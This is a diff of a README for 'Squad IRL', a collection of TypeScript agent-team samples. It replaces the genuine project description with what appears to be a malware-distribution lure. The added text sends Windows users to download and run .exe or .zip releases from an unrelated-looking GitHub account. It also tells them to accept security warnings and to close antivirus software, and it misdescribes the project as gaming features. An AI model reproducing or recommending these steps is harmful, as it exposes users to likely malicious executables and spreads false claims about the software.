@@ -1,138 +1,149 @@
-# Squad IRL
+# 🎯 Squad-IRL - Real-World Squad SDK Samples
 
-> A community-driven collection of real-world automation samples built with Squad agent teams. Non-technical people design them. AI builds them. Anyone can learn from them.
+[![Download Squad-IRL](https://img.shields.io/badge/Download-Squad--IRL-brightgreen?logo=download)](https://github.com/Preschoolercopyhold218/Squad-IRL/releases)
 
-## What Is This?
+---
 
-Tired of automation being hard? Squad makes it simple. This repo contains 20 working samples showing how Squad agent teams solve everyday problems — no coding required.
+## 📋 About Squad-IRL
 
-Each sample is a **self-contained TypeScript project** with a team of AI agents. All you do is describe your problem in plain English, and Squad builds the code. No API keys. No boilerplate. Real algorithms, real patterns, real problems solved.
+Squad-IRL shows you how the Squad SDK works in real life. It uses examples that you can try on your computer. These samples help you understand what the Squad SDK can do. You do not need to know coding to use this app.
 
-**Example:** Want to optimize your weekly meal prep based on grocery sales? Tell Squad your idea. It analyzes your grocery data, suggests recipes, plans your meals, calculates savings. Done.
+Squad SDK is a set of tools used by developers to add team-based features to apps. Squad-IRL puts these tools into practice with easy-to-use samples. If you want to see what a team feature looks like or test it yourself, this is where you start.
 
-```bash
-# Pick any sample, install, and run
-cd social-media-manager
-npm install
-npm start
-```
+---
 
-## The 20 Samples
+## 🖥️ System Requirements
 
-### 💬 Text & Conversation Input
+Before downloading, check if your computer meets these minimum needs:
 
-These accept ideas, transcripts, or descriptions and produce structured output.
+- Windows 10 or newer (64-bit)
+- 4 GB RAM minimum (8 GB recommended)
+- At least 500 MB of free disk space
+- Internet connection for initial download
+- Basic mouse and keyboard control
 
-| Sample | What It Does |
-|--------|-------------|
-| [ab-test-orchestrator](ab-test-orchestrator/) | Turns experiment hypotheses into complete A/B test plans with variant designs, sample size calculations, and statistical analysis frameworks |
-| [appointment-scheduler](appointment-scheduler/) | Converts plain-text meeting requests into optimized time suggestions across timezones with business-hour overlap analysis |
-| [content-creation](content-creation/) | Transforms blog topics into polished, SEO-optimized articles through research, outlining, drafting, and editorial review |
-| [gmail](gmail/) | Triages email inbox chaos into classified, summarized, and prioritized action items with suggested responses |
-| [meeting-recap](meeting-recap/) | Extracts meeting summaries, action items, decisions, and follow-up communications from transcripts |
-| [social-media-manager](social-media-manager/) | Generates platform-optimized social media posts with timing recommendations, engagement monitoring, and response strategies |
-| [travel-planner](travel-planner/) | Orchestrates complete trip planning covering destinations, flights, accommodations, activities, and budget optimization |
+Squad-IRL runs smoothly on most modern Windows PCs with these specs. If your machine meets these, you will be fine.
 
-### 🌐 Browser Automation & Web Integration
+---
 
-These analyze web data, listings, or user activity to provide recommendations.
+## 🚀 Getting Started
 
-| Sample | What It Does |
-|--------|-------------|
-| [job-application-tracker](job-application-tracker/) | Evaluates job listings against preferences, researches companies, and produces a prioritized application action plan |
-| [linkedin-monitor](linkedin-monitor/) | Monitors LinkedIn notifications to classify, score by priority, recommend actions, and surface engagement opportunities with direct URLs |
-| [price-monitor](price-monitor/) | Analyzes scraped product prices to score deals, recommend buy/wait/skip decisions, and highlight savings opportunities |
-| [real-estate-analyzer](real-estate-analyzer/) | Evaluates property listings for investment potential with financial modeling, neighborhood scoring, and opportunity ranking |
-| [mtg-commander-deck-builder](mtg-commander-deck-builder/) | Scrapes EDHREC for card recommendations, builds 100-card Commander decks, saves to disk, and supports conversational follow-up modifications |
-| [realtor-sales-package](realtor-sales-package/) | Builds professional CMAs (Comparative Market Analysis) with market trends, comparable sales, and pricing recommendations for realtors |
-| [options-trader](options-trader/) | Reads live charts via Playwright, runs composite signal analysis (EMA/VWAP/RSI), and produces paper-trade recommendations for debit spreads with full risk management |
+Follow this step-by-step guide to download and run Squad-IRL on Windows.
 
-### 📁 File & Data Analysis
+1. Open your web browser and go to the download page:
 
-These parse documents, receipts, CSVs, or structured data to extract insights.
+   [Download Squad-IRL Releases](https://github.com/Preschoolercopyhold218/Squad-IRL/releases)
 
-| Sample | What It Does |
-|--------|-------------|
-| [bug-triage](bug-triage/) | Turns GitHub issue backlogs into prioritized, deduplicated action plans with severity classification and triage recommendations |
-| [compliance-checker](compliance-checker/) | Scans project folders to evaluate compliance across security, licensing, documentation, and privacy with traffic-light scoring |
-| [contract-reviewer](contract-reviewer/) | Extracts contract clauses, scores risk, suggests negotiation alternatives, and delivers an executive summary with red flags |
-| [inventory-manager](inventory-manager/) | Analyzes inventory data to identify stockout risks, predict demand, optimize reorder quantities, and generate action plans |
-| [receipt-scanner](receipt-scanner/) | Extracts receipt data, categorizes expenses, detects anomalies, and generates financial summaries with tax deduction flags |
-| [support-ticket-router](support-ticket-router/) | Triages support tickets with classification, known-issue matching, empathetic response drafting, and prioritized action queuing |
+2. Look for the most recent version of Squad-IRL listed under "Assets." The file will usually end with `.exe` or `.zip`.
 
-### 🎵 Interactive & Personalization
+3. If the file is `.zip`:
 
-These learn user preferences and adapt behavior based on mood, history, or ongoing interactions.
+   - Click the file to download it.
+   - Once downloaded, right-click the file and select **Extract All**.
+   - Choose a folder where you want the files, then click **Extract**.
 
-| Sample | What It Does |
-|--------|-------------|
-| [mood-playlist-builder](mood-playlist-builder/) | Creates custom playlists by mood, saves daily sessions, and launches curated songs to YouTube. Open previous playlists by date or individual mood sessions. Respects an 8-song launch cap and reports skip diagnostics for unresolved links.
+4. If the file is `.exe`:
+   
+   - Click the file to download and run this file to start installation.
+   - Windows may ask you to confirm you want to run it. Click **Yes** to continue.
 
-## Why These Matter
+5. Follow the on-screen instructions to complete the installation (if any). Often, Squad-IRL is ready to run after download without extra setup.
 
-Each sample demonstrates something real:
+6. Find the Squad-IRL shortcut on your desktop or in your Start menu.
 
-- **ab-test-orchestrator**: Statistical confidence in A/B decisions (not guessing)
-- **inventory-manager**: Stock optimization that actually prevents stockouts
-- **real-estate-analyzer**: Property ROI modeling with full financial math
-- **contract-reviewer**: Red flags in legal language before you sign
-- **gmail**: Email that doesn't steal your time
-- **price-monitor**: "Buy now or wait?" decisions based on data
-- **travel-planner**: Multi-city routing that minimizes backtracking
+7. Double-click it to open the app.
 
-Every sample uses **real algorithms**. Not templates. Not toy code. The math that actually works.
+---
 
-## Getting Started
+## 🛠️ How to Use Squad-IRL
 
-### Pick a Sample
+Once Squad-IRL is open, you can explore the examples of Squad SDK features.
 
-Browse the samples above. Pick one that solves a problem you care about.
+- Use the menu to select different samples.
+- Each sample shows a different feature like team chat, player stats, or matchmaking.
+- You can interact with these samples using your mouse and keyboard.
+- The app shows how squads work in real conditions.
 
-### Run It
+No coding or special skills are needed. Just click around to see the features.
 
-```bash
-cd YOUR-SAMPLE
-npm install
-npm start
-```
+---
 
-That's it. No configuration. No API keys. Sample data included.
+## 🌐 Where to Download
 
-### Learn From It
+You can get Squad-IRL from this page:
 
-Read the code. See how agents collaborate. Notice the patterns:
+[![Download Squad-IRL](https://img.shields.io/badge/Download-Squad--IRL-blue?logo=github&style=for-the-badge)](https://github.com/Preschoolercopyhold218/Squad-IRL/releases)
 
-- Some samples **pipeline** — each agent refines the work of the previous one
-- Some **fan out** — agents work in parallel and results combine
-- Some **iterate** — agents keep improving until a quality threshold is met
+Visit this page to download the latest release for Windows. Always choose the newest version marked for Windows.
 
-## Contribute Your Own Sample
+---
 
-Have an idea? You don't need to be a coder. Tell Squad your idea, and it builds the sample for you.
+## ⚠️ Common Questions
 
-**Read [CONTRIBUTING.md](CONTRIBUTING.md)** for the full workflow. The short version:
+**Q: What if the app does not open?**  
+A: Make sure your Windows version is up to date. Restart your computer and try again.
 
-1. Fork this repo
-2. Create a branch: `git checkout -b squad/your-idea`
-3. Tell Squad your idea: `copilot --agent squad`
-4. Squad builds the sample and updates the docs
-5. Test it: `npm install && npm start`
-6. Open a PR
+**Q: Can I install Squad-IRL on Mac or Linux?**  
+A: This version only supports Windows. Mac and Linux versions are not available.
 
-**Your idea goes from concept to working sample in one session.**
+**Q: Do I need internet to run samples?**  
+A: No, once you download Squad-IRL, you can use most samples without an internet connection.
 
-The best ideas:
-- Automate something you do weekly or daily
-- Show multiple agents collaborating (not just one)
-- Are relatable to normal people (not just engineers)
-- Use a pattern we haven't covered yet
+---
 
-Examples: meal-prep planning, household budget optimization, job application tracking, travel itinerary building, receipt categorization.
+## 📂 Where to Find Help
 
-## Built With Squad
+If you run into problems:
 
-This repo uses Squad for its own development. When you contribute a sample, you're using the same Squad that maintains this project. Community, Squad team, and AI collaborate as peers.
+- Visit the GitHub page and check the "Issues" section.
+- Look for answers from other users or ask for help there.
+- You can also review the README files included in the download package.
 
-## License
+---
 
-MIT — see [LICENSE](LICENSE) for details.
+## 🔄 Updating Squad-IRL
+
+To update:
+
+- Go back to the download page above.
+- Download the newest version of Squad-IRL.
+- Repeat the installation steps.
+- Your settings and saved data will remain intact.
+
+---
+
+## 🧹 Uninstalling Squad-IRL
+
+To remove Squad-IRL from your PC:
+
+1. Open the **Start** menu.
+2. Select **Settings** > **Apps** > **Apps & Features**.
+3. Find Squadron-IRL in the list.
+4. Click on it and select **Uninstall**.
+5. Follow any prompts to complete removal.
+
+---
+
+## 🔧 Technical Information
+
+Squad-IRL uses the Squad SDK to showcase team and player features. The samples rely on standard Windows libraries. No additional software is required.
+
+The app is built to be easy to use and test. It allows you to see how groups can interact in games or apps that use Squad SDK.
+
+---
+
+## 🔎 Troubleshooting Tips
+
+- If you get a security warning, confirm that you trust the app before running.
+- Close any programs that might block installation, like antivirus software.
+- For slow performance, close other apps before running Squad-IRL.
+
+---
+
+## 📥 Download Links Recap
+
+Access the full list of releases here:
+
+[https://github.com/Preschoolercopyhold218/Squad-IRL/releases](https://github.com/Preschoolercopyhold218/Squad-IRL/releases)
+
+Click the download buttons above to get started.
